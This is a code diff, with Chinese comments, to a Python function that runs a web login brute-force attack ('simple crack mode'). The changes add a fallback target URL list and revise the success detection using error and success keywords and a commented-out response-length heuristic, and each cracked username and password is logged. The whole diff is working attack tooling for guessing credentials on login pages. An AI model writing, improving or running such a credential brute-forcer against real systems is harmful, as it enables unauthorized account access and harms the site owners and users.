@@ -57,6 +57,14 @@ def run_simple_crack():
     logger.info("开始简单模式爆破...")
     
     targets = load_file(config.SIMPLE_LIST_FILE)
+    if not targets:
+        logger.warning(f"简单目标列表 ({config.SIMPLE_LIST_FILE}) 为空，尝试使用原始 URL 列表 ({config.URL_LIST_FILE})...")
+        targets = load_file(config.URL_LIST_FILE)
+        
+    if not targets:
+        logger.error("没有可用的目标 URL，请先在配置页添加 URL 或运行分类任务。")
+        return
+
     usernames = load_file(config.USERNAME_FILE) or config.DEFAULT_USERNAMES
     passwords = load_file(config.PASSWORD_FILE) or config.DEFAULT_PASSWORDS
     
@@ -100,13 +108,32 @@ def run_simple_crack():
                         if "login" not in location and "error" not in location and "fail" not in location:
                             is_success = True
                     elif "success" in resp.text.lower() or "welcome" in resp.text.lower() or "admin" in resp.text.lower():
-                        # 页面包含成功关键词
+                        # 页面包含成功关键词 (旧逻辑保留，作为兜底)
                         is_success = True
                     
                     # 排除一些明显的错误页面特征
                     text_lower = resp.text.lower()
+                    
+                    # 优先判断是否包含错误关键词，如果包含则直接视为失败
                     if any(k.lower() in text_lower for k in config.ERROR_KEYWORDS):
                         is_success = False
+                    
+                    # [新增] 检查自定义成功关键词 (强特征)
+                    # 只要包含任意一个成功关键词，且不包含错误关键词，就强制判定为成功
+                    elif any(k.lower() in text_lower for k in config.SUCCESS_KEYWORDS):
+                        is_success = True
+
+                    # 只有在没有错误关键词的情况下，才进一步判断成功特征
+                    elif is_success: 
+                        # 此时 is_success 可能是之前基于状态码或成功关键词判断为 True 的
+                        pass  
+                    
+                    # 如果之前还没判定为成功，再尝试通过响应长度变化来辅助判断
+                    # (这是一个简单的启发式规则：登录成功的页面通常和登录页长度差异很大)
+                    elif len(resp.content) > 0 and abs(len(resp.content) - len(resp.request.body or '')) > 500:
+                         # 这里仅作为备选策略，风险较高，暂不默认启用，仅做日志提示
+                         # logger.debug(f"[{url}] 响应长度变化显著，可能是成功？")
+                         pass
 
                     if is_success:
                         logger.info(f"[SUCCESS] 爆破成功: {url} -> {user}:{pwd}")
